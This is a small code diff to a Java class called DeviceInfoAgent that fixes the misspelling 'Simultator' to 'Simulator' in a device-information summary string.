@@ -91,7 +91,7 @@ public final class DeviceInfoAgent extends Agent {
         // Modello
         // sb.append("Processor: ARM\n");
         if (DeviceInfo.isSimulator()) {
-            sb.append("Simultator\n");
+            sb.append("Simulator\n");
         }
         sb.append("Manifacturer: " + DeviceInfo.getManufacturerName() + "\n");
         sb.append("Model: " + DeviceInfo.getDeviceName() + "\n");
